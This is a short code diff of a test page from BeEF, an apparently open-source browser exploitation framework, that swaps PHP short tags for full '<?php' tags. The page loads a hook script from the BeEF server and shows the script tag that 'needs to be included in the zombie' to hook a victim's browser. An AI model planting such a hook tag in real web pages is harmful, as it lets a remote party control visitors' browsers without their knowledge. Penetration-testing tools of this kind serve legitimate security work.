@@ -1,4 +1,4 @@
-<?
+<?php
 	require_once("../include/config.inc.php");
 ?>
 <html>
@@ -10,12 +10,12 @@
 <body>
 	<img src="../images/beef.gif" alt="BeEF"/>BeEF Test Page<br><br>
 
-	<script language='Javascript' src="<?=BEEF_DOMAIN?>hook/beefmagic.js.php"></script>
+	<script language='Javascript' src="<?php echo BEEF_DOMAIN?>hook/beefmagic.js.php"></script>
 	
 	The following code needs to be included in the zombie:<br>
 	<code>
 	&#x3C;script language='Javascript'
-	src="<?=BEEF_DOMAIN?>hook/beefmagic.js.php'&#x3E;&#x3C;/script&#x3E;
+	src="<?php echo BEEF_DOMAIN?>hook/beefmagic.js.php'&#x3E;&#x3C;/script&#x3E;
     </code>
     <br>
     
